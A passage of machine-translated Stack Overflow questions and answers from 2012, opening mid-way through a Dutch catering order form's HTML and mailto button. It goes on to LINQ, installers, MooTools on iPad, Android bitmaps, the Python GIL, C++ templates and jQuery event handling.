            <td><?php include('optie.php');?></td>
            <td>aangepaste wijnen per fles</td>
            <td>&euro;....... per fles</td>
            <td>&euro;</td>
        </tr>
        <tr>
            <td></td>
            <td></td>
            <td><strong>Totaal prijs:</strong></td>
            <td><strong>&euro;</strong></td>
        </tr>

        <tr>
            <td><strong>Bestellen:</strong></td><td><br>
                U kunt uitsluitend bestellen door middel van ons bestelformulier.
                Uiterlijk voor maandag 17 december inleveren. </td>            
        </tr>
        <tr>
         <td><strong>Afhalen:</strong><br></td>
        </tr>
        <tr>
            <td></td><td> <input type="checkbox" name="option1" value="24 december 12.00-13.00 uur"> 24 december 12.00-13.00 uur</td>
        </tr>
        <tr>            
            <td></td><td> <input type="checkbox" name="option2" value="25 december 12.00-13.00 uur"> 25 december 12.00-13.00 uur</td>
        </tr>
        <tr>            
            <td></td><td> <input type="checkbox" name="option3" value="26 december 12.00-13.00 uur"> 26 december 12.00-13.00 uur<br><br></td>
        </tr>
        <tr>
        <td><strong> Betaling:</strong><br><br><br></td>
        <td>U kunt betalen met pin of contant.<br><br><br></td>
        </tr>
        <tr> 
        <td><strong>Printen</strong></td>
        <td><input type="button" onClick="window.print()" value="Print"/></td>
        <td></td>

        <td>
            <input name="email" type="button" onClick="javascript:location='mailto:test@hotmail.com?subject=Really Cool Website&body=test'"  value= "mail"></td>
  </table>
  </form>

<a href="mailto:coloriteman@gmail.com"></a>
    </div>

</div>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T11:33:42.830

问题用 PHP 标记 - 但问题中有 PHP 代码，与 PHP 无关。

```
onClick="javascript:location='mailto:test@hotmail.com?subject=Really Cool Website&body=test'" 
```

当您可以只使用 a href='mailto:...' 时，为什么还要使用 javascript 调用来调用重定向？

它不起作用的最可能原因是您没有正确编码“body”的值。如果它来自 PHP，那么它应该是[URLencoded](http://php.net/manual/en/function.urlencode.php)。如果它来自 Javacript，则使用[encodeURIComponent](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/encodeURIComponent)。您也应该应用其他参数 - 浏览器能够处理主题中的空格几乎是偶然的。

并非所有的 MUA 都是平等的 - 有时您可以在浏览器和 MUA 之间传递的数据量受到限制。当以这种方式从浏览器调用时，某些邮件客户端将（有效地）截断长正文。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T11:43:06.613

干得好。我完全修改了你的代码来做你想做的事。请将此标记为正确。=)

```
<?php
$html = '' .
'<form>' .
'<div>' . 
      '<table width="900" border="0" cellspacing="0" cellpadding="0" class="content">' .
          '<tr>' .
            '<td width="140"><strong>Selecteer hoeveel porties:</strong><br><hr></td>' .
            '<td width="572"><strong>Beschrijving</strong><br><br><hr></td>' .
            '<td width="112"><strong>Prijs</strong><br><br><hr></td>' .
            '<td width="76"><strong>Totaalprijs</strong><br><br><hr></td>' .
        '</tr>' .
          '<tr>' .
            '<td>' . include('optie.php') . '</td>' .
            '<td><strong>3-gangen traiteurmenu</strong><br>' .
                '(incl. brood en boter)<br>******<br>' .
                'Creme van gerookte paling<br>******<br>' .
                'Gestoofde hertensukade met aardappelgratin, rodekool en een stoofpeertje.<br>******<br>' .
                'Kerstbal van witte en pure chocolade en een vanillesaus.<br><hr>' .
                '</td>' .
            '<td>&euro;16,50</td>' .
            '<td>&euro;</td>' .
        '</tr>' .
          '<tr>' .
            '<td>' . include('optie.php') . '</td>' .
            '<td><strong>Extra voorgerecht</strong><br>' .
                'Gerookte eendenborstfilet met een rilette van eend en een mangochutney.<br></td>' .
            '<td>&euro;5,--</td>' .
            '<td>&euro;</td>' .
        '</tr>' .
          '<tr>' .
            '<td>' . include('optie.php') . '</td>' .
            '<td><strong>Extra tussengerecht</strong><br>' .
                "Gamba's geserveerd in een saus van ....?<br><hr></td>" .
            '<td>&euro;5,--</td>' .
            '<td>&euro;</td>' .
        '</tr>' .
          '<tr>' .
            '<td><strong>Diversen</strong></td>' .
            '<td></td>' .
            '<td></td>' .
            '<td></td>' .

        '</tr>' .
          '<tr>' .
            '<td>' . include('optie.php') . '</td>' .
            '<td>Graved laks met een mosterd-dillesaus</td>' .
            '<td>&euro;....... per 100 gram</td>' .
            '<td>&euro;</td>' .
        '</tr>' .
        '<tr>' .
            '<td>' . include('optie.php') . '</td>' .
            '<td>Kreeftensoep</td>' .
            '<td>&euro;8.95 per 0,5L</td>' .
            '<td>&euro;</td>' .
        '</tr>' .
        '<tr>' .
            '<td>' . include('optie.php') . '</td>' .
            '<td>Wildpeper</td>' .
            '<td>&euro;2.35 per 100 gram</td>' .
            '<td>&euro;</td>' .
        '</tr>' .
        '<tr>' .
            '<td>' . include('optie.php') . '</td>' .
            '<td>Aardappelgratin</td>' .
            '<td>&euro;2.95</td>' .
            '<td>&euro;</td>' .
        '</tr>' .
        '<tr>' .
            '<td>' . include('optie.php') . '</td>' .
            '<td>Rodekool</td>' .
            '<td>&euro;3.95</td>' .
            '<td>&euro;</td>' .
        '</tr>' .
        '<tr>' .
            '<td>' . include('optie.php') . '</td>' .
            '<td>Botersaus</td>' .
            '<td>&euro;4,50 per 250 ml.</td>' .
            '<td>&euro;</td>' .
        '</tr>' .
        '<tr>' .
            '<td>' . include('optie.php') . '</td>' .
            '<td>Rode portsaus</td>' .
            '<td>&euro;3.95 per 250 ml.</td>' .
            '<td>&euro;</td>' .
        '</tr>' .
        '<tr>' .
            '<td>' . include('optie.php') . '</td>' .
            '<td>aangepaste wijnen per fles</td>' .
            '<td>&euro;....... per fles</td>' .
            '<td>&euro;</td>' .
        '</tr>' .
        '<tr>' .
            '<td></td>' .
            '<td></td>' .
            '<td><strong>Totaal prijs:</strong></td>' .
            '<td><strong>&euro;</strong></td>' .
        '</tr>' .

        '<tr>' .
            '<td><strong>Bestellen:</strong></td><td><br>' .
                'U kunt uitsluitend bestellen door middel van ons bestelformulier.' .
                'Uiterlijk voor maandag 17 december inleveren. </td>' .     
        '</tr>' .
        '<tr>' .
        '<td><strong>Afhalen:</strong><br></td>' .
        '</tr>' .
        '<tr>' .
            '<td></td><td> <input type="checkbox" name="option1" value="24 december 12.00-13.00 uur"> 24 december 12.00-13.00 uur</td>' .
        '</tr>' .
        '<tr>' .       
            '<td></td><td> <input type="checkbox" name="option2" value="25 december 12.00-13.00 uur"> 25 december 12.00-13.00 uur</td>' .
        '</tr>' .
        '<tr>            ' .
            '<td></td><td> <input type="checkbox" name="option3" value="26 december 12.00-13.00 uur"> 26 december 12.00-13.00 uur<br><br></td>' .
        '</tr>' .
        '<tr>' .
        '<td><strong> Betaling:</strong><br><br><br></td>' .
        '<td>U kunt betalen met pin of contant.<br><br><br></td>' .
        '</tr>' .
        '<tr> ' .
        '<td><strong>Printen</strong></td>' .
        '<td><input type="button" onClick="window.print()" value="Print"/></td>' .
        '<td></td>' .

        '<td>' .
            '<input name="email" type="button" onClick="javascript:location='mailto:test@hotmail.com?subject=Really Cool Website&body=test'"  value= "mail"></td>' .
  '</table>' .
  '</form>' .
  '';

echo '' .
$html .
'<a href="mailto:coloriteman@gmail.com" onClick="javascript:location="mailtotest@hotmail.com?subject=Really Cool Website&body=' . $html . '">Click Here</a>' .
    '</div>' .

'</div>' .
'';
?> 
```

享受！

# c# - 需要获取新选定元素的上下文（可能是像“this”这样的关键字？）

> ID：12213939
> 
> 赞同：3
> 
> 时间：2012-08-31T10:57:00.997
> 
> 标签：c#, linq, xml-parsing

拥有这两个类和这个 linq 请求：

```
var cats = from c in xml.Descendants("category")
           let categoryName = c.Attribute("name").Value
           let descendants = c.Descendants()
           select new Category
           {
                Name = categoryName,
                Items = from d in descendants
                        let typeId = d.Attribute("id").Value
                        select new Item
                        {
                            Id = typeId,
                            Name = d.Value,
                            Category = ???????
                        }
           };

class Category
{
    string Name;
    IEnumerable<Item> Items;
}

class Item
{
    string Id;
    string Name;
    Category Category;
} 
```

如何将项目的类别影响到当前选定的类别？一种`this`可能的关键字？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T11:16:57.850

是时候递归了！只需包装获取的函数`Category`，然后在需要时调用它。

```
public static IQueryable<Category> GetCategories(string catName, XDocument xml)
{
      var cats = from c in xml.Descendants("category")
                 let categoryName = c.Attribute("name").Value
                 let descendants = c.Descendants()
                 where (catName == "" || categoryName == catName)
                 select new Category
                 {
                      Name = categoryName,
                      Items = from d in descendants
                              let typeId = d.Attribute("id").Value
                              select new Item
                              {
                                  Id = typeId,
                                  Name = d.Value,
                                  Category = GetCategories(categoryName, xml).FirstOrDefault()
                              }
                };

       return cats.AsQueryable();
} 
```

你这样称呼它：

```
XDocument xml = XDocument.Parse(...); // parse the xml file
IQueryable<Category> cats = GetCategories("", xml); 
```

函数调用的第一次加载使用空字符串作为类别名称，因为我们不需要过滤结果。然后我们递归调用相同的函数，但按类别名称过滤。试试看，对我有用。

# c# - 准备安装程序

> ID：12213942
> 
> 赞同：0
> 
> 时间：2012-08-31T10:57:14.553
> 
> 标签：c#, installation

我编写了使用第三方 dll 的小型控制台项目（例如：HtmlAgilityPack 或 Newtonsoft.Json）。我怎样才能为这个项目准备安装程序？

我想知道如何做到这一点，因为 dll 在客户端计算机上不可用，并且可执行文件不能单独运行。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T11:05:10.140

要将您的应用程序（及其依赖项）打包到安装程序中，您有多种解决方案：

*   [Windows 安装程序设置](http://msdn.microsoft.com/en-us/library/windows/desktop/cc185688%28v=vs.85%29.aspx)：与 VisualStudio 集成（但不在 express 中）。简单易用。它可以自动检测、打包和部署您的项目所依赖的dll。
*   [WindowsInstallerXml](http://wix.sourceforge.net/)：提供更多功能，但对于小型项目可能“过大”。
*   [安装盾牌](http://msdn.microsoft.com/en-us/library/2kt85ked.aspx)
*   InnoSetup

# javascript - mootools click:relay 没有在 ipad/iphone 上触发

> ID：12213944
> 
> 赞同：2
> 
> 时间：2012-08-31T10:57:18.877
> 
> 标签：javascript, mootools

我只是用 mootools 创建一个点击事件，如下所示：

```
$$('body').addEvent('click:relay(div.smart-bg)', function(){

xxxxxxxxxxx

}); 
```

但是，这似乎不会在 iPad 上触发（而其他点击事件会触发）。这与它是添加的动态元素并且我正在使用：relay 的事实有关吗？

任何指针都非常感谢。

广告。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T17:20:56.633

当我在`div`.

[来自 quirksmode 的这篇文章](http://www.quirksmode.org/blog/archives/2010/09/click_event_del.html)可能会有所帮助：

> 这种行为一定是有原因的。我不知道那个原因是什么，但目前我认为这是一个内存管理问题。显然，使页面上的所有元素都可点击需要太多资源，Apple 工程师决定禁用它。

和...

> 幸运的是，它很容易解决：您必须通过给它自己的 onclick 事件处理程序来使元素可点击。该处理程序可以为空；只要它存在，它就会使任何元素可点击。

也许在你的情况下......

```
$$('.smart-bg').each(function(el) {
    el.onclick = function() {};
}); 
```

当然，鉴于它是一个委托事件，您必须确保在`.smart-bg`您动态创建的每个元素上重新创建 onclick 处理程序。

# android - 将位图工厂与 TouchImageView 一起使用时出现 OutOfMemoryError

> ID：12213949
> 
> 赞同：0
> 
> 时间：2012-08-31T10:57:51.140
> 
> 标签：android, android-imageview, out-of-memory, android-image, bitmapfactory

我正在尝试制作一个片段，该片段将使用 TouchImageView（https://github.com/MikeOrtiz/TouchImageView）显示可缩放图像

该片段还有一个用于更改图像的微调器。问题是第一个图像加载正常，但是当我使用滚动条更改图像时，我得到一个 OutOfMemoryError 并且程序崩溃。这是我的代码

```
public class mapFragment extends SherlockFragment {

String[] Levels = { "Ground Floor", "First Floor",
        "Second Floor", "Third Floor"
};

Button button;
@Override
public View onCreateView(LayoutInflater inflater, ViewGroup group, Bundle saved)
{
    View v = inflater.inflate(R.layout.maps_layout, group, false);

    final TouchImageView img = (TouchImageView) v.findViewById(R.id.touchimage1);
    final Bitmap snoop = BitmapFactory.decodeResource(getResources(), R.drawable.groundfloor);
    img.setImageBitmap(snoop);

    final Spinner s = (Spinner) v.findViewById(
            R.id.spinnerlevels);

    ArrayAdapter<String> adapter = new ArrayAdapter<String>(this
            .getActivity().getBaseContext(),
            android.R.layout.simple_spinner_item, Levels);
    s.setAdapter(adapter);

    s.setOnItemSelectedListener(new OnItemSelectedListener() {

        public void onItemSelected(AdapterView<?> parent, View view, 
                int pos, long id) {
            // An item was selected. You can retrieve the selected item using
            // parent.getItemAtPosition(pos)
            int item = s.getSelectedItemPosition();

            if(item ==0){
                snoop.recycle();
                Bitmap snoop = BitmapFactory.decodeResource(getResources(), R.drawable.groundfloor);
                img.setImageBitmap(snoop);
            }
            if(item ==1){
                snoop.recycle();
                Bitmap snoop = BitmapFactory.decodeResource(getResources(), R.drawable.firstfloor);
                img.setImageBitmap(snoop);
            }
            if(item ==2){
                snoop.recycle();
                Bitmap snoop = BitmapFactory.decodeResource(getResources(), R.drawable.secondfloor);
                img.setImageBitmap(snoop);
            }
            if(item ==3){
                snoop.recycle();
                Bitmap snoop = BitmapFactory.decodeResource(getResources(), R.drawable.thirdfloor);
                img.setImageBitmap(snoop);
            }

        }

        public void onNothingSelected(AdapterView<?> parent) {
            // Another interface callback
        }
    });

    img.setMaxZoom(8f);

    return (v);

}

} 
```

“recylce()”不应该删除第一个图像，让位于内存中的新图像吗？以 MB 为单位的图像大小为 1.4、1.5、1.5、1.3

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T11:31:26.457

> “recylce()”不应该删除第一个图像，让位于内存中的新图像吗？

不，recycle() 方法只是将此位图标记为“已死”，并且稍后可以将其作为垃圾回收。这是[recycle()](http://developer.android.com/reference/android/graphics/Bitmap.html#recycle%28%29)方法的文档：

> 释放与此位图关联的本机对象，并清除对像素数据的引用。这不会同步释放像素数据；如果没有其他引用，它只是允许它被垃圾收集。该位图被标记为“死”，这意味着如果调用 getPixels() 或 setPixels() 将引发异常，并且不会绘制任何内容。此操作无法反转，因此只有在您确定位图没有进一步用途时才应调用它。这是一个高级调用，通常不需要调用，因为当没有更多对该位图的引用时，正常的 GC 进程将释放该内存。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T11:54:43.077

对于图像的每个像素，您的堆使用 8 个字节。现在 1754 x 2481 x 8 有多少内存？答案是 32.94 MB 的堆内存。在许多设备上，您不会拥有超过 16 MB 的堆，这些堆也用于其他东西。你现在明白你的问题了吗？

您需要使图像更小，否则您的应用程序将永远无法运行:)

# python - file.read() 多处理和 GIL

> ID：12213957
> 
> 赞同：4
> 
> 时间：2012-08-31T10:58:23.103
> 
> 标签：python, multiprocessing, gil

我已经读过用 C 实现的某些 Python 函数，我假设它们包括 file.read()，可以在它们工作时释放 GIL，然后在完成时将其恢复，这样做可以利用多个内核，如果它们'重新可用。

我正在使用多进程来并行化一些代码，目前我有三个进程，父进程，一个从文件读取数据的子进程，以及一个从第一个子进程传递给它的数据生成校验和的子进程。

现在，如果我理解这一点，似乎创建一个新进程来读取文件就像我目前正在做的那样是不必要的，我应该在主进程中调用它。问题是我是否理解这一点，我是否会在主进程或单独的进程中保持读取以获得更好的性能？

因此，鉴于我的功能是读取和管道要处理的数据：

```
def read(file_path, pipe_out):
    with open(file_path, 'rb') as file_:
        while True:
            block = file_.read(block_size)
            if not block:
                break
            pipe_out.send(block)
    pipe_out.close() 
```

我认为这肯定会使用多个内核，但也会引入一些开销：

```
multiprocess.Process(target=read, args).start() 
```

但现在我想知道这样做是否也会使用多个内核，减去开销：

```
read(*args) 
```

任何人对哪个更快以及出于什么原因的任何见解将不胜感激！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T11:41:24.233

我认为这是您问题的主要部分：

> 问题是我是否理解这一点，并且将读取保存在主进程或单独的进程中会获得更好的性能吗？

我假设您的目标是尽可能快地读取和处理文件。在任何情况下，文件读取都受 I/O 限制，而不是 CPU 限制。处理数据的速度不能超过读取数据的速度。所以文件 I/O 显然限制了你的软件的性能。您无法通过使用并发线程/进程进行文件读取来提高读取数据速率。'低级' CPython 也没有这样做。只要您在一个进程或线程中读取文件（即使在具有 GIL 的 CPython 的情况下，线程也可以），您每次将获得尽可能多的数据，因为您可以从存储设备获得。如果您在主线程中执行文件读取也很好，只要没有其他阻塞调用实际上会减慢文件读取速度。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T11:28:43.213

好的，正如评论所指出的，实际的问题是：

`Does (C)Python create threads on its own, and if so, how can I make use of that?`

简短的回答：**没有。**

**但是**，这些 C-Function 对 Python 程序员来说仍然很有趣的原因如下。默认情况下，在同一个解释器中运行的两个 python 代码片段不能并行执行，这是由于被称为*Global Interpreter Lock*的邪恶，也就是 GIL。每当解释器执行 Python 代码时，都会保留 GIL，这意味着上面的语句，没有两段 Python 代码可以在同一个解释器中并行运行。

尽管如此，您仍然可以在 python 中使用多线程，即当您进行大量 I/O 或大量使用外部库（如 numpy、scipy、lxml 等）时，这些都知道问题和尽可能释放 GIL（即，只要它们不需要与 python 解释器交互）。

我希望这能稍微澄清一下这个问题。

# c++ - 链接模板类函数

> ID：12213959
> 
> 赞同：1
> 
> 时间：2012-08-31T10:58:44.320
> 
> 标签：c++, templates

我发现自己对模板的理解存在挑战，我知道模板的源代码必须放在头文件中才能访问模板实例化的所有依赖类型。

所以，在这个例子中：

```
// This code cannot be placed in the cpp file
template <typename T> T foo(T v)
{
    return -v;
} 
```

的主体`T foo(T v)`必须放在头文件中，然后，当`foo`函数在某处实例化时，会创建“真实”主体函数，`T`用真实类型替换符号。使用此代码：

```
int bar = 5;
float baz = 6.66f;
bar = foo<int>(bar);
baz = foo<float>(baz); 
```

模板实例化机制基于之前定义的模板创建以下函数：

```
int foo(int v)
{
    return -v;
}

float foo(float v)
{
    return -v;
} 
```

但是，当我们有一个模板类时，该类可以具有根本不使用依赖类型的函数：

```
template <typename T> class Foo
{
    Foo() : mistery(0), value(0) {}; // We're using the dependant type.
    AddMistery() { ++mistery; }; // We are not using the dependant type.

    int mistery;
    T value;
}; 
```

我首先想到该`AddMistery`方法可以放在cpp文件中，因为该方法没有使用依赖类型，但是当我尝试时，链接失败。这会儿我一记耳光，想起模板类的不同实例不是同一个类。因此，当链接器完成它的工作时，它会查找`AddMistery`方法的主体，但没有找到它，因为 ir 被放入 cpp 文件中：

```
// Foo.h
template <typename T> class Foo
{
    Foo() : mistery(0), value(0) {}; // We're using the dependant type.
    AddMistery(); // We are not using the dependant type.

    int mistery;
    T value;
};

// Foo.cpp
#include "Foo.h"

template <typename T> Foo<T>::AddMistery()
{
    ++mistery;
}

// Main.cpp
#include "Foo.h"

int main(int argc, char **argv)
{
    Foo<int> i;
    Foo<float> f;

    i.AddMistery(); // Link Error, where's the Foo<int>::AddMistery body?
    f.AddMistery(); // Link Error, where's the Foo<float>::AddMistery body?

    return 0;
}; 
```

所以，最后，这是一个问题：有一种方法可以在头文件和 cpp 文件之间拆分模板类，将所有非类型相关方法的主体移动到 cpp，而不是将所有方法主体保留在头文件中？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T11:12:29.423

除非您打算将模板仅用于有限的知名类型集，例如和`int`，否则这是不可能的。在这种情况下，您可以使用**显式实例化**并将模板函数定义放在文件中。`short``double`**`.cpp`**

 *** * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T11:03:02.373

简短的回答是否定的，因为类模板不是类，除非您使用某个模板参数对其进行实例化。所以没有`Foo::AddMystery()`实施。

可以这样想：成员函数知道依赖类型，因为它们有一个隐式的第一个参数，它是指向它们类的对象的指针。所以

```
Foo<int> f;
f.AddMistery(); 
```

相当于

```
Foo<int> f;
Foo<int>::AddMistery(&f); 
```

如果您有某些类型的模板的实例化，那么您*可以*`Foo<int>::AddMistery`在文件中实现`.cpp`，但这与不需要模板参数在其主体中的函数无关。**

# javascript - javascript / jquery - 避免重复评估条件

> ID：12213961
> 
> 赞同：0
> 
> 时间：2012-08-31T10:59:07.153
> 
> 标签：javascript, events, scroll, jquery

我目前在 jquery 的滚动事件中有一个条件运行，这似乎没有多大意义，因为它只会执行一次。我想知道是否有任何方法可以确保条件只会被评估一次。

这是我的代码：

```
$window.scroll(function() {
  if (s1_doAnimate == true){
    s1_doAnimate = false;
  }
}) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T11:09:37.297

使用[$.one](http://api.jquery.com/one/)

```
$(window).one('scroll', function(){
...
}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-31T11:07:10.080

满足条件后，您可以取消绑定处理程序；

```
$window.scroll(function foo /* give the function a name */ () {
  if (s1_doAnimate == true){
    s1_doAnimate = false;

    // Unbind the handler referenced by the name...
    $window.off(foo);
  }
}) 
```

# jquery - jQuery 在配对输入上切换禁用/启用

> ID：12213964
> 
> 赞同：2
> 
> 时间：2012-08-31T10:59:24.280
> 
> 标签：jquery, html, input, toggle, disabled-input

我有 2 个成对的输入字段，需要在它们之间切换启用/禁用（如果启用了另一个应该禁用）。

我不知道如何解决这个问题，有什么想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T11:05:22.333

示例：`item1`已启用，`item2`已禁用

```
<input type="text" id="item1">
<input type="text" id="item2" disabled>

<button id="switch">Click here to toggle</button> 
```

当单击某种开关时，这将切换项目。在任何切换它的地方使用它，即上面的按钮：

```
$("#switch").on("click", function()
{
    $("#item1").prop("disabled", !$("#item1").prop("disabled"));
    $("#item2").prop("disabled", !$("#item2").prop("disabled"));
}); 
```

如果您真的想确保它们是对立的；

```
$("#switch").on("click", function()
{
    var toggle = $("#item1").prop("disabled");

    $("#item1").prop("disabled", !toggle );
    $("#item2").prop("disabled", toggle ); // item2 will always be the opposite of item1
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T11:45:52.087

这给出了启用的输入：

```
<input type="button" value="Button1" />
<input type="button" value="Button2" />
<input type="text" value="Text1" />
<input type="checkbox" value="CheckBox1" />
<input type="radio" value="Radio1" />
<input type="submit" value="Submit1" />
<input type="reset" value="Reset1" />

$(document).ready(function() {
    var id = "";
    // Test
    $('input').attr("disabled", "disabled");
    // Remove attr disabled from text to try code
    $('input[type="text"]').removeAttr("disabled");

    // Check for attr != disabled here
    $('input').each(function () {
        if ($(this).attr("disabled") != "disabled")
        { id = $(this).get(); }
    });
    // Found
    alert($(id).val());
}); 
```

[http://jsfiddle.net/sVDYe/83/](http://jsfiddle.net/sVDYe/83/)

这会切换所有输入的禁用，但复选框：

```
<input type="button" value="Button1" disabled="disabled" />
<input type="button" value="Button2" disabled="disabled" />
<input type="text" value="Text1" disabled="disabled" />
<input type="checkbox" value="CheckBox1" />
<input type="radio" value="Radio1" disabled="disabled" />
<input type="submit" value="Submit1" disabled="disabled" />
<input type="reset" value="Reset1" disabled="disabled" />

$(document).ready(function() {
    var id = "";
    // Check for attr != disabled here
    $('input').each(function () {
        if ($(this).attr("disabled") != "disabled")
        { id = $(this).get(); }
    });
    // Found
    alert($(id).val());
    // Make sure all disabled but this
    $('input').attr("disabled", "disabled");
    $(id).removeAttr("disabled");
}); 
```

[http://jsfiddle.net/sVDYe/88/](http://jsfiddle.net/sVDYe/88/)

最后在两个输入之间切换：

```
$(document).ready(function() {
    $('input').click(function () {
        var id = $(this).get();
        toggleButtons(id);
    });
    function toggleButtons(id){
        // Check for attr != disabled here
        $('input').removeAttr("disabled");
        $(id).attr("disabled","disabled");
    }        
}); 
```

[http://jsfiddle.net/sVDYe/91/](http://jsfiddle.net/sVDYe/91/)

就这么简单。还确保只有真正的启用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T12:24:14.760

[我摆弄了这个问题并想出了这个脚本](http://jsfiddle.net/t6KDf/1/)：

```
inputFields = $("#group").find("input");

$("#toggleFields").on("click", function(){
    inputFields.each(toggleElement);        
});

function toggleElement(index, element) {
    element.disabled = !element.disabled;
    //idea from: http://stackoverflow.com/a/4702086/1063730
}
​

​ 
```

如果您想要另一个事件切换的原因，您只需`$("#toggleFields").on("click")`根据您的需要进行交换。

# windows-phone-7 - WP7 列表框滚动

> ID：12213966
> 
> 赞同：0
> 
> 时间：2012-08-31T10:59:33.880
> 
> 标签：windows-phone-7, listbox

我创建了一个简单的应用程序，其中包含嵌套的 ListBox 和字符串。如果我滚动它真的很快 - 有空白空间。我可以提高渲染速度还是我可以以某种方式减慢 ListBox 中的滚动速度？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T13:08:33.303

为了克服滚动时出现的黑色，您需要虚拟化滚动控件。为此，您应该继承 IList 并创建自己的 Collection，类似于 ObservableCollection，在其中您必须根据缓存要求覆盖默认索引器，同时为您的项目维护缓存。我觉得这可能是您正在寻找的：http: [//blogs.msdn.com/b/ptorr/archive/2010/08/16/virtualizing-data-in-windows-phone-7-silverlight-applications.aspx](http://blogs.msdn.com/b/ptorr/archive/2010/08/16/virtualizing-data-in-windows-phone-7-silverlight-applications.aspx)

该页面上有一个示例项目。试试看。

我也觉得你正面临这个问题[http://blog.rsuter.com/?p=258](http://blog.rsuter.com/?p=258)。我想这将使用虚拟化本身来解决。希望能帮助到你

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-02T12:33:45.430

米兰发布的博客是一个很好的起点。通过在滚动时更改列表项的项模板来虚拟化数据。当布局复杂时，这将无法达到预期。

但我建议你在你正在处理的布局上做更多的工作。有太多的堆栈面板以使布局有点通用会破坏性能。

# javascript - 是否可以一次为元素的所有事件分配阻止默认值？

> ID：12213971
> 
> 赞同：6
> 
> 时间：2012-08-31T10:59:50.057
> 
> 标签：javascript, jquery, events

> **可能重复：**
> [jQuery - 如何绑定 DOM 元素上的所有事件？](https://stackoverflow.com/questions/5848598/jquery-how-can-i-bind-all-events-on-a-dom-element)

想象一下，如果我们想让某些元素完全不可交互。

我们当然可以为 click 事件绑定一个阻止默认值，如下所示：

```
$('form *').bind('click', function(event) {
    event.preventDefault();
}); 
```

但这只是一个事件，还有更多事件，例如悬停、聚焦、选择启动等等。

我们可以在一行中指定它们，例如“click focus hover dblclick blur selectstart”，但这没有多大意义，也不容易维护。

那么，是否可以在不区分事件类型的情况下绑定事件侦听器？也许一些本机 JavaScript 侦听器允许它？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T11:03:51.170

**没有这种可能性**，因为并非所有元素都支持相同的事件，并且并非所有事件都以相同的方式运行。您始终必须明确提供事件列表，无论是静态定义还是由吐出事件名称[的脚本动态定义。](https://stackoverflow.com/a/5848702/75642)

尽管我链接到一个创建事件名称数组的脚本，但这些仅在一个元素上创建。您当然应该使用更复杂和更慢的脚本来生成它，该脚本枚举所有有问题的元素并添加缺失的事件。使用 Javascript 对象作为关联数组，以更快地搜索是否添加了特定事件。

## 更好的建议

您尝试做的可能是一个高度过度设计的解决方案。当我创建一个应禁用某些元素（无论是链接、按钮或其他任何东西）的演示可点击界面时，我宁愿通过定义一个禁用相关元素的 CSS 类来做到这一点，并有一个简单的脚本在之后禁用。

您还可以通过提供您希望在特定元素上禁用哪些事件（默认为`click`事件）来进一步利用这一点。

```
<!-- no events; use defaults -->
<a href="#" class="disable">No-follow link</a>
<button class="disable">Nothing happens</button>
<!-- provide events -->
<a href="#" class="disable" data-events="click blur">No-follow link</a>
<form class="disable" data-events="submit">...</form> 
```

脚本

```
$(function() {

    var disable = function(evt) {
        evt.preventDefault();
        console.log("Prevented on " + evt.target.tagName);
    };

    $(".disable").each(function() {
        var ctx = $(this);
        ctx.bind(ctx.data("events") || "click", disable);
    });
}); 
```

## 使用智能默认值

上例定义了一个单一的事件默认值。`click`事件。这很好，并且在大多数情况下都有效，但并非全部。`form`例如，元素总是必须定义应禁用的**提交事件。**所以。然后智能默认。我们还应该考虑这样一个事实，即需要抑制**的事件列表通常很短**。如果我们使用默认值覆盖大多数情况，我们只会对那些实际偏离默认值的元素**产生很小的开销。**

```
$(function() {

    // click is still default event
    // this object defines per element events that aren't just click
    var extraDefaults = {
        form: "submit"
    };

    var disable = function(evt) {
        evt.preventDefault();
        console.log("Prevented on " + evt.target.tagName);
    };

    $(".disable").each(function() {
        var ctx = $(this);
        ctx.bind(
            // use inline-defined events
            ctx.data("events") ||
            // use extra defaults if present
            extraDefaults[this.tagName.toLower()] ||
            // just use default click event
            "click",
            disable);
    });
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T11:22:47.603

您可以像这样绑定大多数 jQuery 事件：

```
$("#elementID").on(Object.keys(jQuery.event.fixHooks).join(" "), function(e) { 
    e.preventDefault(); 
}); 
```

这将阻止以下事件的默认值：

> click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave keydown keypress keyup contextmenu

[**小提琴**](http://jsfiddle.net/YAdXk/2/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T12:12:35.130

好吧，在考虑了所有选项之后，对于所有这些活动的喧嚣，它看起来仍然不方便。由于它还必须单独绑定每个事件的处理程序，因此脚本也会影响性能。

我将坚持使用更简单的解决方案，只需在顶部放置一个带有透明 bg 的 div 来覆盖我们的元素。

```
$('form').css('position','relative').prepend($('<div class="mask" style="position:absolute;z-index:9000;height:100%;width:100%;background-image:url(1px_transparent.png);"></div>')); 
```

这将自动填充元素的整个区域，或者，我们可以使用半透明的图片，这样用户也会理解这是锁定元素，不会引起混淆。

要解锁，我们只需从元素中删除 .mask div。

**编辑**

新小提琴：http: [//jsfiddle.net/YAdXk/8/](http://jsfiddle.net/YAdXk/8/)

实际上我们可以通过将`tabindex`属性设置为`-1`

```
.find('input,textarea,select').attr('tabindex','-1'); 
```

更新的小提琴也可以防止标签。

**编辑2**

或者，我们可以扩展 jQuery 以在任何元素上使用我们的自定义`lock()`和函数。`unlock()`

